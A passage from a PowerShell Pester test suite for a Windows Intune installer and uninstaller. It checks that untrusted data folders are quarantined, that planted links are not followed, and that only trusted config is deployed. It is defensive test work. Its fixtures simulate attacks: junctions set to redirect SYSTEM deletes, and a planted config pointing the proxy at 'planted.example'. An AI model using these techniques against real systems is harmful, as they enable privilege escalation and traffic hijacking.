        [regex]::Match($text, '(?ms)^catch \{.*?\n\}').Value | Should -Match 'if \(-not \$noticesWritten\) \{ Write-CESetupNotice -Notice \$setupNotices \}' -Because 'a failure before logging starts still records them'

        # What they record: the warning names the quarantine, and Write-CESetupNotice puts it in the log and the event log.
        . (Get-TestInstallerCode -Path $installer -Name @('Test-CEReparsePoint', 'Remove-CELink', 'Assert-CEInDataRoot', 'Get-CEAsidePath', 'Move-CEItemAside', 'New-CELockedDirectory', 'Initialize-CEDataRoot', 'Write-CEInstallEvent', 'Write-CESetupNotice'))
        function New-CEDataDirectorySecurity { param([switch]$UsersRead) $s = New-Object Security.AccessControl.DirectorySecurity; $s.SetSecurityDescriptorSddlForm('D:(A;OICI;FA;;;WD)'); return $s }
        function Test-CELockedFolder { param([string]$Path) if (Test-Path -LiteralPath (Join-Path $Path 'planted.txt')) { return "$Path is owned by S-1-5-21-1-2-3-1001, not SYSTEM or Administrators" } return '' }
        function Get-CERegistryString { param([string]$Path, [string]$Name) return '' }
        Mock Write-CEInstallEvent { }
        $pd = Join-Path $TestDrive 'pd-notice'
        $root = Join-Path $pd 'EngramicBaseline'
        New-Item -ItemType Directory -Force -Path (Join-Path $root 'config') | Out-Null
        Set-Content -LiteralPath (Join-Path $root 'planted.txt') -Value 'racer'
        $notices = @()
        Initialize-CEDataRoot -Path $root -RegPath 'unsealed' -WarningVariable +notices -WarningAction SilentlyContinue
        $aside = @(Get-ChildItem -LiteralPath $pd -Directory -Filter 'EngramicBaseline.untrusted-*')
        $aside.Count | Should -Be 1
        $asidePath = $aside[0].FullName
        "$notices" | Should -Match ([regex]::Escape($asidePath))
        $log = Join-Path $TestDrive 'install-notice.log'
        Start-Transcript -LiteralPath $log | Out-Null
        try { Write-CESetupNotice -Notice $notices }
        finally { Stop-Transcript | Out-Null }
        # The console host word-wraps a warning and the transcript records it wrapped, so compare without whitespace.
        ((Get-Content -LiteralPath $log -Raw) -replace '\s', '') | Should -Match ([regex]::Escape(($asidePath -replace '\s', ''))) -Because 'the install log names the quarantine'
        Should -Invoke Write-CEInstallEvent -Times 1 -Exactly -ParameterFilter { $Id -eq 1003 -and $Message -like "*$asidePath*" } -Because 'so does the Application event log'
    }

    It 'the install carries nothing over from a folder it moves aside, and deploys the config overrides staged in the package' {
        # A config override put down before the app installed (a platform script that ran first) is in a
        # folder the install cannot trust, even where the file looks admin-owned and locked: while a
        # standard user controlled the folder, they could have made the file theirs to change, changed it
        # and locked it again. So nothing is copied out of it. Config staged in the package's data\config
        # folder, the supported path, reaches the fresh folder instead.
        $installer = Join-Path $script:intune 'Install-CEChecker.ps1'
        . (Get-TestInstallerCode -Path $installer -Name @('Test-CEReparsePoint', 'Remove-CELink', 'Assert-CEInDataRoot', 'Get-CEAsidePath', 'Move-CEItemAside', 'New-CELockedDirectory', 'Initialize-CEDataRoot', 'Copy-CEStagedConfig'))
        function New-CEDataDirectorySecurity { param([switch]$UsersRead) $s = New-Object Security.AccessControl.DirectorySecurity; $s.SetSecurityDescriptorSddlForm('D:(A;OICI;FA;;;WD)'); return $s }
        # Owner-less descriptors a standard user can apply (the real ones name Administrators as owner).
        function New-CEDataFileSecurity { $s = New-Object Security.AccessControl.FileSecurity; $s.SetSecurityDescriptorSddlForm('D:P(A;;FA;;;WD)'); return $s }
        # Every folder and file reads as admin-owned and locked, as a script run as SYSTEM leaves them.
        function Test-CELockedFolder { param([string]$Path) if (Test-CEReparsePoint -Path $Path) { return "$Path is a link" } return '' }
        function Get-CERegistryString { param([string]$Path, [string]$Name) return '' }
        $pd = Join-Path $TestDrive 'pd-staged'
        $root = Join-Path $pd 'EngramicBaseline'
        $pkg = Join-Path $TestDrive 'pkg-staged'
        New-Item -ItemType Directory -Force -Path (Join-Path $root 'config'), (Join-Path $pkg 'data\config') | Out-Null
        Set-Content -LiteralPath (Join-Path $root 'config\cloud-services.json') -Value '{ "from": "before the app" }'
        Set-Content -LiteralPath (Join-Path $root 'config\network.json') -Value '{ "proxyUrl": "http://planted.example:3128" }'
        Set-Content -LiteralPath (Join-Path $pkg 'data\config\cloud-services.json') -Value '{ "from": "the package" }'
        # No sealed marker: a folder this version's install did not create.
        Initialize-CEDataRoot -Path $root -RegPath 'unsealed' 3>$null 6>$null
        foreach ($name in @('logs', 'reports', 'cache', 'packs')) { New-CELockedDirectory -Path (Join-Path $root $name) -DataRoot $root 3>$null }
        New-CELockedDirectory -Path (Join-Path $root 'config') -DataRoot $root -UsersRead 3>$null
        Copy-CEStagedConfig -Source (Join-Path $pkg 'data\config') -ConfigDir (Join-Path $root 'config') -DataRoot $root 3>$null 6>$null
        Test-Path -LiteralPath (Join-Path $root 'config\network.json') | Should -BeFalse -Because 'nothing is carried over from a folder the install cannot trust'
        Get-Content -LiteralPath (Join-Path $root 'config\cloud-services.json') | Should -Be '{ "from": "the package" }' -Because 'the override staged in the package is deployed'
        $aside = @(Get-ChildItem -LiteralPath $pd -Directory -Filter 'EngramicBaseline.untrusted-*')
        $aside.Count | Should -Be 1
        Get-Content -LiteralPath (Join-Path $aside[0].FullName 'config\network.json') | Should -Match 'planted' -Because 'the old folder is kept whole for an administrator'
    }

    It 'Copy-CEStagedConfig replaces a trusted file, moves anything else aside, removes a link as a link, and copies only .json files' {
        $installer = Join-Path $script:intune 'Install-CEChecker.ps1'
        . (Get-TestInstallerCode -Path $installer -Name @('Test-CEReparsePoint', 'Remove-CELink', 'Assert-CEInDataRoot', 'Get-CEAsidePath', 'Move-CEItemAside', 'Copy-CEStagedConfig'))
        # An owner-less descriptor a standard user can apply (the real one names Administrators as owner).
        function New-CEDataFileSecurity { $s = New-Object Security.AccessControl.FileSecurity; $s.SetSecurityDescriptorSddlForm('D:P(A;;FA;;;WD)'); return $s }
        # A stand-in trust check: a file holding 'user-owned' is one a standard user owns.
        function Test-CELockedFolder { param([string]$Path) if ((Test-Path -LiteralPath $Path -PathType Leaf) -and ((Get-Content -LiteralPath $Path -Raw) -match 'user-owned')) { return "$Path is owned by S-1-5-21-1-2-3-1001, not SYSTEM or Administrators" } return '' }
        $pd = Join-Path $TestDrive 'pd-copy'
        $root = Join-Path $pd 'EngramicBaseline'
        $cfg = Join-Path $root 'config'
        $src = Join-Path $TestDrive 'pkg-copy\data\config'
        $outside = Join-Path $TestDrive 'copy-outside'
        New-Item -ItemType Directory -Force -Path $src, $outside, (Join-Path $cfg 'odd.json') | Out-Null
        foreach ($n in @('network', 'firmware-catalog', 'odd', 'linked')) { Set-Content -LiteralPath (Join-Path $src "$n.json") -Value "{ `"staged`": `"$n`" }" }
        Set-Content -LiteralPath (Join-Path $src 'notes.txt') -Value 'not config'
        Set-Content -LiteralPath (Join-Path $cfg 'network.json') -Value '{ "old": "admin" }'
        # An override an administrator left read-only is still replaced, not a failed install.
        [IO.File]::SetAttributes((Join-Path $cfg 'network.json'), [IO.FileAttributes]::ReadOnly)
        Set-Content -LiteralPath (Join-Path $cfg 'firmware-catalog.json') -Value '{ "old": "user-owned" }'
        Set-Content -LiteralPath (Join-Path $cfg 'thresholds.json') -Value '{ "untouched": true }'
        Set-Content -LiteralPath (Join-Path $outside 'keep.json') -Value 'keep'
        # A file symbolic link needs a privilege; a junction with a file's name stands in for a planted link.
        $link = Join-Path $cfg 'linked.json'
        New-Item -ItemType Junction -Path $link -Target $outside | Out-Null
        try {
            Copy-CEStagedConfig -Source $src -ConfigDir $cfg -DataRoot $root -WarningVariable copyNotices -WarningAction SilentlyContinue 6>$null
            Get-Content -LiteralPath (Join-Path $cfg 'network.json') | Should -Be '{ "staged": "network" }' -Because 'a trusted file is replaced'
            Get-Content -LiteralPath (Join-Path $cfg 'firmware-catalog.json') | Should -Be '{ "staged": "firmware-catalog" }'
            Get-Content -LiteralPath (Join-Path $cfg 'odd.json') | Should -Be '{ "staged": "odd" }' -Because 'a folder in the way is moved aside, never written into'
            Get-Content -LiteralPath (Join-Path $cfg 'linked.json') | Should -Be '{ "staged": "linked" }'
            Test-CEReparsePoint -Path (Join-Path $cfg 'linked.json') | Should -BeFalse -Because 'the link was removed as a link and a real file put in its place'
            Get-Content -LiteralPath (Join-Path $outside 'keep.json') | Should -Be 'keep' -Because 'nothing a link pointed at is touched'
            Get-Content -LiteralPath (Join-Path $cfg 'thresholds.json') | Should -Match 'untouched' -Because 'a file the package does not carry is left alone'
            Test-Path -LiteralPath (Join-Path $cfg 'notes.txt') | Should -BeFalse -Because 'only .json files are config'
            @(Get-ChildItem -LiteralPath $cfg -Filter '*.tmp' -Force).Count | Should -Be 0
            # The user-owned file and the folder went beside the data folder, never inside it, and the warnings say where.
            @(Get-ChildItem -LiteralPath $root -Recurse -Force -Filter '*.untrusted-*').Count | Should -Be 0
            $fwAside = @(Get-ChildItem -LiteralPath $pd -File -Filter 'EngramicBaseline.untrusted-*-config-firmware-catalog.json')
            $fwAside.Count | Should -Be 1
            Get-Content -LiteralPath $fwAside[0].FullName | Should -Match 'user-owned'
            @(Get-ChildItem -LiteralPath $pd -Directory -Filter 'EngramicBaseline.untrusted-*-config-odd.json').Count | Should -Be 1
            "$copyNotices" | Should -Match ([regex]::Escape($fwAside[0].FullName))
            # A read-only file in the package (say, from a read-only share) must not make the next upgrade fail.
            [IO.File]::SetAttributes((Join-Path $src 'network.json'), [IO.FileAttributes]::ReadOnly)
            Copy-CEStagedConfig -Source $src -ConfigDir $cfg -DataRoot $root 3>$null 6>$null
            { Copy-CEStagedConfig -Source $src -ConfigDir $cfg -DataRoot $root 3>$null 6>$null } | Should -Not -Throw -Because 'the upgrade replaces the copy it made last time'
            ([IO.File]::GetAttributes((Join-Path $cfg 'network.json')) -band [IO.FileAttributes]::ReadOnly) | Should -Be 0
        }
        finally {
            if ((Test-Path -LiteralPath $link) -and (Test-CEReparsePoint -Path $link)) { [IO.Directory]::Delete($link, $false) }
            if (Test-Path -LiteralPath (Join-Path $src 'network.json')) { [IO.File]::SetAttributes((Join-Path $src 'network.json'), [IO.FileAttributes]::Normal) }
        }
    }

    It 'when elevated, a config file the install deploys is born administrator-owned and locked' {
        # Runs only where the suite runs elevated (CI). A standard user cannot name Administrators as owner.
        if (-not (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))) {
            Set-ItResult -Skipped -Because 'needs an elevated session'
            return
        }
        . (Get-TestInstallerCode -Path (Join-Path $script:intune 'Install-CEChecker.ps1') -Name @('Test-CEReparsePoint', 'Remove-CELink', 'Assert-CEInDataRoot', 'Get-CEAsidePath', 'Move-CEItemAside', 'Test-CELockedFolder', 'New-CEDataFileSecurity', 'Copy-CEStagedConfig'))
        $root = Join-Path $TestDrive 'pd-elevated-copy\EngramicBaseline'
        $src = Join-Path $TestDrive 'pkg-elevated-copy\data\config'
        New-Item -ItemType Directory -Force -Path (Join-Path $root 'config'), $src | Out-Null
        Set-Content -LiteralPath (Join-Path $src 'network.json') -Value '{ "proxyUrl": "" }'
        Copy-CEStagedConfig -Source $src -ConfigDir (Join-Path $root 'config') -DataRoot $root 3>$null 6>$null
        $acl = Get-Acl -LiteralPath (Join-Path $root 'config\network.json')
        "$($acl.GetOwner([Security.Principal.SecurityIdentifier]))" | Should -Be 'S-1-5-32-544'
        $acl.AreAccessRulesProtected | Should -BeTrue
        $writers = @($acl.GetAccessRules($true, $true, [Security.Principal.SecurityIdentifier]) | Where-Object { @('S-1-5-18', 'S-1-5-32-544') -notcontains "$($_.IdentityReference)" -and ([long]$_.FileSystemRights -band 0x000D0156) })
        $writers.Count | Should -Be 0 -Because 'only SYSTEM and Administrators can change it'
    }

    It 'the install deploys config staged in the package once logging has started, and the build and release handle data\config' {
        $text = (Get-Content -LiteralPath (Join-Path $script:intune 'Install-CEChecker.ps1') -Raw) -replace '\r\n', "`n"
        $main = $text.Substring($text.IndexOf("`ntry {"))
        $copy = $main.IndexOf("Copy-CEStagedConfig -Source (Join-Path `$packageRoot 'data\config') -ConfigDir (Join-Path `$dataRoot 'config') -DataRoot `$dataRoot")
        $copy | Should -BeGreaterThan $main.IndexOf('Start-Transcript -LiteralPath $log') -Because 'the copy is logged'
        $copy | Should -BeLessThan $main.IndexOf('Register-ScheduledTask') -Because 'the first audit sees the overrides'
        $copy | Should -BeLessThan $main.IndexOf('Start-ScheduledTask')
        $main | Should -Match 'Write-CESetupNotice -Notice \$stagedNotices' -Because 'anything it moves aside is logged and recorded as an event'
        # The build packs the .json files in data\config; a release refuses to ship any.
        $build = Get-Content -LiteralPath (Join-Path $script:intune 'Build-IntunePackage.ps1') -Raw
        $build | Should -Match "Get-ChildItem -LiteralPath \(Join-Path \`$repo 'data\\config'\) -Filter '\*\.json' -File"
        $build | Should -Match "Join-Path \`$payload 'data\\config'"
        $release = Get-Content -LiteralPath (Join-Path (Join-Path $script:RepoRoot 'tools') 'New-SignedRelease.ps1') -Raw
        $guard = $release.IndexOf("Get-ChildItem -LiteralPath (Join-Path `$repo 'data') -Recurse -File")
        $guard | Should -BeGreaterThan 0
        $guard | Should -BeLessThan $release.IndexOf('Build-IntunePackage.ps1') -Because 'checked before anything is built'
    }

    It 'uninstall -RemoveData deletes only a trusted data root and leaves quarantine folders for an admin, walking no user tree' {
        # A quarantine folder (EngramicBaseline.untrusted-*) is by design a tree a standard user owns and
        # may still hold handles to. SYSTEM must never recurse into it (a junction swapped in mid-walk
        # would redirect the delete), so it is left for an administrator; only a trusted, admin-owned
        # data root is deleted, and even then no junction inside it is followed.
        $installer = Join-Path $script:intune 'Uninstall-CEChecker.ps1'
        . (Get-TestInstallerCode -Path $installer -Name @('Remove-CETreeNoFollow', 'Get-CEFolderTrustProblem', 'Get-CERegistryString', 'Remove-CEDataFolders'))
        $pd = Join-Path $TestDrive 'pd-uninstall'
        $dataRoot = Join-Path $pd 'EngramicBaseline'
        $outside = Join-Path $TestDrive 'uninstall-outside'
        $aside = "$dataRoot.untrusted-aaaa"
        New-Item -ItemType Directory -Force -Path (Join-Path $dataRoot 'reports\r1'), (Join-Path $aside 'sub'), $outside | Out-Null
        Set-Content -LiteralPath (Join-Path $outside 'keep.txt') -Value 'keep'
        Set-Content -LiteralPath (Join-Path $aside 'planted.txt') -Value 'mine'
        # A junction inside the (trusted) data root: the recursive delete must remove it as a link, not follow it.
        $rootLink = Join-Path $dataRoot 'reports\to-outside'
        New-Item -ItemType Junction -Path $rootLink -Target $outside | Out-Null
        # A junction inside the quarantine folder: it must never be reached, because the folder is not walked.
        $asideLink = Join-Path $aside 'to-outside'
        New-Item -ItemType Junction -Path $asideLink -Target $outside | Out-Null
        # The install sealed the root, and it reads as the locked, admin-owned folder (a non-admin test
        # user cannot really set that).
        Mock Get-CERegistryString { '0.3.2' }
        Mock Get-CEFolderTrustProblem { '' }
        try {
            Remove-CEDataFolders -DataRoot $dataRoot -ProgramData $pd -SealRegPath 'sealed' 3>$null 6>$null
            Test-Path -LiteralPath $dataRoot | Should -BeFalse -Because 'a trusted data root is removed'
            Test-Path -LiteralPath $aside | Should -BeTrue -Because 'a quarantine folder is left for an administrator'
            Get-Content -LiteralPath (Join-Path $aside 'planted.txt') | Should -Be 'mine' -Because 'its contents are never touched'
            Should -Invoke Get-CEFolderTrustProblem -Times 0 -ParameterFilter { $Path -like '*untrusted-*' } -Because 'a quarantine tree is never trust-checked or walked'
            Get-Content -LiteralPath (Join-Path $outside 'keep.txt') | Should -Be 'keep' -Because 'no junction was followed'
        }
        finally { foreach ($j in @($rootLink, $asideLink)) { if ((Test-Path -LiteralPath $j) -and ([IO.File]::GetAttributes($j) -band [IO.FileAttributes]::ReparsePoint)) { [IO.Directory]::Delete($j, $false) } } }
    }

    It 'uninstall -RemoveData checks each folder just before listing it and leaves one a standard user controls unwalked' {
        # The root was checked, then the whole tree walked, so a subtree a non-administrator controlled
        # (say, a folder a helpdesk group made after being granted write) could have a junction swapped in
        # mid-walk and SYSTEM would delete through it. Every folder is now checked immediately before it is
        # listed, and one that fails is never listed or walked.
        . (Get-TestInstallerCode -Path (Join-Path $script:intune 'Uninstall-CEChecker.ps1') -Name @('Remove-CETreeNoFollow', 'Get-CEFolderTrustProblem', 'Get-CERegistryString', 'Remove-CEDataFolders'))
        $pd = Join-Path $TestDrive 'pd-uninstall-walk'
        $dataRoot = Join-Path $pd 'EngramicBaseline'
        $userDir = Join-Path $dataRoot 'reports\A'
        $outside = Join-Path $TestDrive 'uninstall-walk-outside'
        New-Item -ItemType Directory -Force -Path $userDir, (Join-Path $dataRoot 'logs'), $outside | Out-Null
        Set-Content -LiteralPath (Join-Path $dataRoot 'logs\audit-1.log') -Value 'log'
        Set-Content -LiteralPath (Join-Path $dataRoot 'status.json') -Value '{}'
        Set-Content -LiteralPath (Join-Path $userDir 'zz-sentinel.txt') -Value 'mine'
        Set-Content -LiteralPath (Join-Path $outside 'zz-sentinel.txt') -Value 'target'
        # A junction the user made earlier, ready to swap in mid-walk. A is never listed, so it never gets the chance.
        $userLink = Join-Path $userDir 'to-outside'
        New-Item -ItemType Junction -Path $userLink -Target $outside | Out-Null
        Mock Get-CERegistryString { '0.3.2' }
        Mock Get-CEFolderTrustProblem { if ($Path -eq $userDir) { "$Path is owned by S-1-5-21-1-2-3-1001, not an administrator" } else { '' } }
        try {
            Remove-CEDataFolders -DataRoot $dataRoot -ProgramData $pd -SealRegPath 'sealed' -WarningVariable walkNotices 3>$null 6>$null
            Should -Invoke Get-CEFolderTrustProblem -Times 1 -Exactly -ParameterFilter { $Path -eq $userDir } -Because 'each folder is checked just before it would be listed'
            Get-Content -LiteralPath (Join-Path $userDir 'zz-sentinel.txt') | Should -Be 'mine' -Because 'a folder that fails the check is never listed or walked'
            Test-Path -LiteralPath $userLink | Should -BeTrue -Because 'nothing inside it is touched, not even a link'
            Get-Content -LiteralPath (Join-Path $outside 'zz-sentinel.txt') | Should -Be 'target'
            Test-Path -LiteralPath (Join-Path $dataRoot 'logs') | Should -BeFalse -Because 'trusted folders are still removed'
            Test-Path -LiteralPath (Join-Path $dataRoot 'status.json') | Should -BeFalse
            Test-Path -LiteralPath $dataRoot | Should -BeTrue -Because 'a folder that still holds what was left is not removed'
            "$walkNotices" | Should -Match ([regex]::Escape($userDir)) -Because 'what was left is reported'
        }
        finally { if ((Test-Path -LiteralPath $userLink) -and ([IO.File]::GetAttributes($userLink) -band [IO.FileAttributes]::ReparsePoint)) { [IO.Directory]::Delete($userLink, $false) } }
    }

    It 'uninstall -RemoveData leaves a quarantine it finds inside the data folder, unwalked' {
        # Earlier builds of this change quarantined a folder inside the data folder as <name>.untrusted-<id>.
        # Such a tree may be a standard user's, so, like any quarantine, it is left for an administrator.
        . (Get-TestInstallerCode -Path (Join-Path $script:intune 'Uninstall-CEChecker.ps1') -Name @('Remove-CETreeNoFollow', 'Get-CEFolderTrustProblem', 'Get-CERegistryString', 'Remove-CEDataFolders'))
        $pd = Join-Path $TestDrive 'pd-uninstall-nested'
        $dataRoot = Join-Path $pd 'EngramicBaseline'
        $nested = Join-Path $dataRoot 'packs.untrusted-0123'
        New-Item -ItemType Directory -Force -Path (Join-Path $nested 'A'), (Join-Path $dataRoot 'logs') | Out-Null
        Set-Content -LiteralPath (Join-Path $nested 'A\keep.txt') -Value 'mine'
        Mock Get-CERegistryString { '0.3.2' }
        Mock Get-CEFolderTrustProblem { '' }
        Remove-CEDataFolders -DataRoot $dataRoot -ProgramData $pd -SealRegPath 'sealed' 3>$null 6>$null
        Get-Content -LiteralPath (Join-Path $nested 'A\keep.txt') | Should -Be 'mine' -Because 'a quarantine is never walked'
        Should -Invoke Get-CEFolderTrustProblem -Times 0 -ParameterFilter { $Path -like '*.untrusted-*' }
        Test-Path -LiteralPath (Join-Path $dataRoot 'logs') | Should -BeFalse
        Test-Path -LiteralPath $dataRoot | Should -BeTrue
    }

    It 'uninstall -RemoveData does not walk a data root the install did not seal' {
        # A root without the DataRootSealed marker may be one an older version locked after a standard user
        # made it, and its creator may still hold a handle that lets them change it, however locked it looks.
        . (Get-TestInstallerCode -Path (Join-Path $script:intune 'Uninstall-CEChecker.ps1') -Name @('Remove-CETreeNoFollow', 'Get-CEFolderTrustProblem', 'Get-CERegistryString', 'Remove-CEDataFolders'))
        $pd = Join-Path $TestDrive 'pd-uninstall-unsealed'
        $dataRoot = Join-Path $pd 'EngramicBaseline'
        New-Item -ItemType Directory -Force -Path (Join-Path $dataRoot 'reports\r1') | Out-Null
        Set-Content -LiteralPath (Join-Path $dataRoot 'reports\r1\report.html') -Value '<html/>'
        Mock Get-CERegistryString { '' }
        Mock Get-CEFolderTrustProblem { '' }
        Remove-CEDataFolders -DataRoot $dataRoot -ProgramData $pd -SealRegPath 'unsealed' -WarningVariable unsealedNotices 3>$null 6>$null
        Test-Path -LiteralPath (Join-Path $dataRoot 'reports\r1\report.html') | Should -BeTrue -Because 'an unsealed root is left for an administrator'
        Should -Invoke Get-CEFolderTrustProblem -Times 0 -Because 'it is not even read'
        "$unsealedNotices" | Should -Match 'DataRootSealed'
    }

    It 'uninstall -RemoveData does not delete an untrusted data root as SYSTEM' {
        # An untrusted root left by a failed upgrade, or one a standard user controls, must not be walked.
        . (Get-TestInstallerCode -Path (Join-Path $script:intune 'Uninstall-CEChecker.ps1') -Name @('Remove-CETreeNoFollow', 'Get-CEFolderTrustProblem', 'Get-CERegistryString', 'Remove-CEDataFolders'))
        $pd = Join-Path $TestDrive 'pd-uninstall2'
        $dataRoot = Join-Path $pd 'EngramicBaseline'
        New-Item -ItemType Directory -Force -Path (Join-Path $dataRoot 'sub') | Out-Null
        Set-Content -LiteralPath (Join-Path $dataRoot 'sub\x.txt') -Value 'x'
        Mock Get-CERegistryString { '0.3.2' }
        Mock Get-CEFolderTrustProblem { "$Path is owned by S-1-5-21-1-2-3-1001, not an administrator" }
        Remove-CEDataFolders -DataRoot $dataRoot -ProgramData $pd -SealRegPath 'sealed' 3>$null
        Test-Path -LiteralPath $dataRoot | Should -BeTrue -Because 'an untrusted root is left for an admin, not deleted as SYSTEM'
        Test-Path -LiteralPath (Join-Path $dataRoot 'sub\x.txt') | Should -BeTrue
    }

    It 'uninstall -RemoveData removes a data root that is a link without following it or trust-checking it' {
        . (Get-TestInstallerCode -Path (Join-Path $script:intune 'Uninstall-CEChecker.ps1') -Name @('Remove-CETreeNoFollow', 'Get-CEFolderTrustProblem', 'Get-CERegistryString', 'Remove-CEDataFolders'))
        $pd = Join-Path $TestDrive 'pd-uninstall3'
        $target = Join-Path $TestDrive 'link-target'
        New-Item -ItemType Directory -Force -Path $pd, $target | Out-Null
        Set-Content -LiteralPath (Join-Path $target 'keep.txt') -Value 'keep'
        $dataRoot = Join-Path $pd 'EngramicBaseline'
        New-Item -ItemType Junction -Path $dataRoot -Target $target | Out-Null
        Mock Get-CERegistryString { '' }
        Mock Get-CEFolderTrustProblem { throw 'a link is removed as a link, so its ACL is never read' }
        try {
            Remove-CEDataFolders -DataRoot $dataRoot -ProgramData $pd -SealRegPath 'unsealed' 3>$null 6>$null
            Test-Path -LiteralPath $dataRoot | Should -BeFalse -Because 'the link is removed'
            Get-Content -LiteralPath (Join-Path $target 'keep.txt') | Should -Be 'keep' -Because 'what the link pointed at is left alone'
        }
        finally { if ((Test-Path -LiteralPath $dataRoot) -and ([IO.File]::GetAttributes($dataRoot) -band [IO.FileAttributes]::ReparsePoint)) { [IO.Directory]::Delete($dataRoot, $false) } }
    }

    It 'Get-CEFolderTrustProblem in the uninstaller rejects a deny against administrators, as the installer does' {
        . (Get-TestInstallerCode -Path (Join-Path $script:intune 'Uninstall-CEChecker.ps1') -Name @('Get-CEFolderTrustProblem'))
        $dir = Join-Path $TestDrive 'uninstall-deny'
        New-Item -ItemType Directory -Force -Path $dir | Out-Null
        $rule = { param([string]$Sid, [Security.AccessControl.FileSystemRights]$R, [string]$T = 'Allow') [pscustomobject]@{ IdentityReference = [Security.Principal.SecurityIdentifier]::new($Sid); FileSystemRights = $R; AccessControlType = [Security.AccessControl.AccessControlType]$T } }
        $adminOnly = @((& $rule 'S-1-5-18' 'FullControl'), (& $rule 'S-1-5-32-544' 'FullControl'))
        $newAcl = {
            param([object[]]$Rules)
            $o = New-Object psobject
            $o | Add-Member -MemberType ScriptMethod -Name GetOwner -Value { param($t) [Security.Principal.SecurityIdentifier]::new('S-1-5-32-544') }
            $o | Add-Member -MemberType NoteProperty -Name TestRules -Value @($Rules)
            $o | Add-Member -MemberType ScriptMethod -Name GetAccessRules -Value { param($e, $i, $t) $this.TestRules }
            return $o
        }
        Mock Get-Acl { & $newAcl $adminOnly }.GetNewClosure()
        Get-CEFolderTrustProblem -Path $dir | Should -BeNullOrEmpty
        Mock Get-Acl { & $newAcl ($adminOnly + @(& $rule 'S-1-5-18' 'Delete' 'Deny')) }.GetNewClosure()
        Get-CEFolderTrustProblem -Path $dir | Should -Match 'denies S-1-5-18' -Because 'a deny against SYSTEM could stop the delete part-way'
        Mock Get-Acl { & $newAcl ($adminOnly + @(& $rule 'S-1-5-32-545' 'Write' 'Deny')) }.GetNewClosure()
        Get-CEFolderTrustProblem -Path $dir | Should -BeNullOrEmpty -Because 'denying a standard user is not a problem'
    }

    It 'the sealed-at-birth marker is a separate key the installer writes and uninstall keeps unless -RemoveData' {
        # Finding 3: uninstall used to delete the marker along with the detection key, so every reinstall
        # or supersede-with-uninstall moved the sealed root aside and lost config, packs and reports. The
        # marker now lives in a separate key that uninstall leaves in place unless -RemoveData is given.
        $install = (Get-Content (Join-Path $script:intune 'Install-CEChecker.ps1') -Raw) -replace '\r\n', "`n"
        $uninstall = (Get-Content (Join-Path $script:intune 'Uninstall-CEChecker.ps1') -Raw) -replace '\r\n', "`n"
        $install | Should -Match "\`$sealRegPath = 'HKLM:\\SOFTWARE\\EngramicBaseline\.DataRoot'" -Because 'the marker is a key separate from the detection key'
        $install | Should -Match "New-ItemProperty -Path \`$sealRegPath -Name 'DataRootSealed'"
        $install | Should -Match "Initialize-CEDataRoot -Path \`$dataRoot -RegPath \`$sealRegPath"
        $install | Should -Not -Match "New-ItemProperty -Path \`$regPath -Name 'DataRootSealed'" -Because 'the marker is written to the separate key, not the detection key that uninstall deletes'
        # Uninstall deletes the seal key ONLY inside the -RemoveData data-removal branch (the one that
        # calls Remove-CEDataFolders, not the 64-bit relaunch's one-line -RemoveData pass-through).
        $rd = [regex]::Match($uninstall, '(?s)if \(\$RemoveData\) \{\s*Remove-CEDataFolders.*?\n    \}')
        $rd.Success | Should -BeTrue
        $rd.Value | Should -Match "Remove-Item -Path \`$sealRegPath"
        $outside = ($uninstall -replace [regex]::Escape($rd.Value), '')
        $outside | Should -Not -Match "Remove-Item -Path \`$sealRegPath" -Because 'a plain uninstall must keep the marker so a reinstall keeps the data folder'
        $uninstall | Should -Match "Remove-Item -Path \`$regPath -Recurse -Force -ErrorAction SilentlyContinue" -Because 'the detection key is still removed on a plain uninstall'
    }

    It 'writes status.json even when something is in the way at a fixed temporary name' {
        # A folder a user made at status.json.tmp before the install locked the data folder would
        # otherwise make every audit fail, leaving whatever status.json was there in place.
        InModuleScope CEAudit -Parameters @{ Root = (Join-Path $TestDrive 'tmp-planted') } {
            param($Root)
            $path = Join-Path $Root 'status.json'
            New-Item -ItemType Directory -Force -Path "$path.tmp" | Out-Null
            Set-Content -LiteralPath $path -Value '{ "schemaVersion": 0 }'
            Write-CEStatus -Status ([ordered]@{ schemaVersion = 1 }) -Path $path | Should -Be $path
            (Get-Content -LiteralPath $path -Raw | ConvertFrom-Json).schemaVersion | Should -Be 1
            @(Get-ChildItem -LiteralPath $Root -Filter '*.tmp' -File).Count | Should -Be 0 -Because 'the temporary file is renamed over status.json'
            Mock Set-Content { throw 'disk full' }
            { Write-CEStatus -Status ([ordered]@{ schemaVersion = 2 }) -Path $path } | Should -Throw '*disk full*'
            (Get-Content -LiteralPath $path -Raw | ConvertFrom-Json).schemaVersion | Should -Be 1
        }
    }

    It 'compliance scripts ignore a status.json a standard user could have written when run as SYSTEM' {
        # Each script is uploaded on its own, so both carry the same check.
        $copies = foreach ($file in @('Detect-CECompliance.ps1', 'Discover-CECompliance.ps1')) {
            $ast = [System.Management.Automation.Language.Parser]::ParseFile((Join-Path $script:intune $file), [ref]$null, [ref]$null)
            $ast.Find({ param($n) $n -is [System.Management.Automation.Language.FunctionDefinitionAst] -and $n.Name -eq 'Get-CEStatusTrustProblem' }, $true).Extent.Text
        }
        @($copies).Count | Should -Be 2
        $copies[0] | Should -BeExactly $copies[1]

        $root = Join-Path $TestDrive 'trust-status'
        New-TestStatus -Kind Insecure -DataRoot $root | Out-Null
        $link = Join-Path $TestDrive 'trust-link'
        New-Item -ItemType Junction -Path $link -Target $root | Out-Null
        function global:New-TestOwnerAcl {
            param([string]$Sid, [object[]]$Rules = @())
            $acl = New-Object psobject
            $acl | Add-Member -MemberType ScriptMethod -Name GetOwner -Value ([scriptblock]::Create("param(`$type) [Security.Principal.SecurityIdentifier]::new('$Sid')"))
            $acl | Add-Member -MemberType NoteProperty -Name TestRules -Value @($Rules)
            $acl | Add-Member -MemberType ScriptMethod -Name GetAccessRules -Value { param($explicit, $inherited, $type) $this.TestRules }
            return $acl
        }
        function global:New-TestRule {
            param([string]$Sid, [Security.AccessControl.FileSystemRights]$Rights, [string]$Type = 'Allow')
            [pscustomobject]@{ IdentityReference = [Security.Principal.SecurityIdentifier]::new($Sid); FileSystemRights = $Rights; AccessControlType = [Security.AccessControl.AccessControlType]$Type }
        }
        $locked = @((New-TestRule -Sid 'S-1-5-18' -Rights FullControl), (New-TestRule -Sid 'S-1-5-32-544' -Rights FullControl))
        $global:TestRootOwner = 'S-1-5-18'
        $global:TestStatusOwner = 'S-1-5-18'
        $global:TestRootRules = $locked
        $global:TestStatusRules = $locked
